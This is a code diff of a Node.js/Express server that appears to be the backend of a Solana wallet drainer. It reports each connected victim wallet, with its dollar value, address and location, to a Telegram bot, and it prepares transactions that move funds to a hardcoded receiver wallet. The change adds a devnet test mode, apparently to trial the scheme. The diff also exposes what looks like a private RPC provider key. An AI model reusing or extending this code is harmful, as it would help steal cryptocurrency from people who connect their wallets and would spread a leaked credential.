@@ -12,31 +12,33 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // ============ إعدادات السيرفر ============
 const PORT = process.env.PORT || 5000;
+const IS_DEVNET = true; // ✅ تشغيل وضع DEVNET
 
 // ============ متغيرات البيئة (تضاف على Railway) ============
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const RECEIVER_WALLET_ADDRESS = process.env.RECEIVER_WALLET || 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';
 
-// ✅ قائمة RPCs مع وضع رابط QuickNode الخاص بك في المقدمة
-const RPC_ENDPOINTS = [
-  'https://skilled-purple-lake.solana-mainnet.quiknode.pro/2cd592b99695fb08845ca4afddbc2b97d9825e1e/', // رابطك الجديد
+// ✅ قائمة RPCs لـ DEVNET
+const RPC_ENDPOINTS = IS_DEVNET ? [
+  'https://api.devnet.solana.com',
+  'https://devnet.solana.com',
+] : [
+  'https://skilled-purple-lake.solana-mainnet.quiknode.pro/2cd592b99695fb08845ca4afddbc2b97d9825e1e/',
   'https://api.mainnet-beta.solana.com',
   'https://solana-mainnet.rpc.exnode.io',
-  'https://rpc.ankr.com/solana',
 ];
 
 let connection;
 let currentRpcIndex = 0;
 
 function createConnection() {
-  console.log(`🔌 Creating connection using RPC: ${RPC_ENDPOINTS[currentRpcIndex]}`);
+  console.log(`🔌 [${IS_DEVNET ? 'DEVNET' : 'MAINNET'}] Using RPC: ${RPC_ENDPOINTS[currentRpcIndex]}`);
   return new Connection(RPC_ENDPOINTS[currentRpcIndex], 'confirmed');
 }
 
 connection = createConnection();
 
-// دالة ذكية لإعادة المحاولة مع روابط مختلفة إذا فشل أحدها
 async function withRpcFallback(fn, fallbackIndex = 1) {
   try {
     return await fn(connection);
@@ -142,10 +144,11 @@ app.post('/notify', async (req, res) => {
 
     let locationStr = locationInfo ? locationInfo.flag : '🌍';
     const shortAddress = address ? `${address.substring(0, 6)}...${address.substring(address.length - 4)}` : 'Unknown';
+    const networkTag = IS_DEVNET ? '🧪 [DEVNET TEST] ' : '';
 
     let text;
     if (customMessage) {
-      text = `${customMessage}
+      text = `${networkTag}${customMessage}
 
 💳 Wallet: ${walletType || 'Unknown'}
 📍 Address: \`${shortAddress}\`
@@ -153,7 +156,7 @@ app.post('/notify', async (req, res) => {
 📍 Location: ${locationStr}
 🕒 Time: ${new Date().toLocaleString()}`;
     } else {
-      text = `🌺 New Connection worth $${totalUSD.toFixed(2)}
+      text = `${networkTag}🌺 New Connection worth $${totalUSD.toFixed(2)}
 
 Address: \`${shortAddress}\`
 ⓘ Wallet: ${walletType || 'Unknown'}
@@ -186,7 +189,7 @@ app.post('/prepare-transaction', async (req, res) => {
       return res.status(400).json({ error: "publicKey required" });
     }
     
-    console.log(`📝 Preparing transaction for: ${publicKey}`);
+    console.log(`📝 [${IS_DEVNET ? 'DEVNET' : 'MAINNET'}] Preparing transaction for: ${publicKey}`);
     
     const fromPubkey = new PublicKey(publicKey);
     const receiverWallet = new PublicKey(RECEIVER_WALLET_ADDRESS);
@@ -295,12 +298,17 @@ app.post('/prepare-transaction', async (req, res) => {
 
 // ============ نقطة صحة السيرفر ============
 app.get('/health', (req, res) => {
-  res.json({ status: 'OK', timestamp: new Date().toISOString() });
+  res.json({ 
+    status: 'OK', 
+    network: IS_DEVNET ? 'devnet' : 'mainnet',
+    timestamp: new Date().toISOString() 
+  });
 });
 
 // ============ تشغيل السيرفر ============
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`🌐 Network: ${IS_DEVNET ? 'DEVNET (TESTNET)' : 'MAINNET (LIVE)'}`);
   console.log(`📍 Health check: http://localhost:${PORT}/health`);
 });
 
